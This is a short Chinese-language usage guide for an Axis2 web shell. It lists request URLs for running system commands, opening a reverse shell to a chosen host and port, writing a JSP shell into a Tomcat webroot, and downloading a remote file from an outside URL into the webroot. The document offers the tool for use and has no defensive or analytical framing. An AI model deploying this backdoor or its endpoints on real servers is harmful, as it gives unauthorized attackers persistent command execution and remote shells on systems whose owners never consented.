axis2
=========

axis2 web shell


使用介绍：

1、命令执行
http://1.1.1.1/services/config/exec?cmd=whoami 
(不说了，执行命令。注意:xml换行没有处理好)

2、反弹shell
http://1.1.1.1/services/config/shell?host=1.1.1.1&port=5555 
(Linux则使用bash反弹shell，Windows则会进行socket执行shell)


3、文件上传
http://1.1.1.1/services/config/upload?path=/opt/tomcat/webapps/ROOT/shell.jsp 
(会把resource目录下面的one.txt 写成shell.jsp，注意：全路径，带*文件名)


4、文件下载
http://1.1.1.1/services/config/download?url=http://www.ooo.com/mm.txt&path=/opt/tomcat/webapps/ROOT/shell.jsp
(会把这个URL的文件写成shell.jsp，注意：全路径，带*文件名)


5、class目录查看
http://1.1.1.1/services/config/getClassPath
(会显示当前class的路径，方便文件上传)


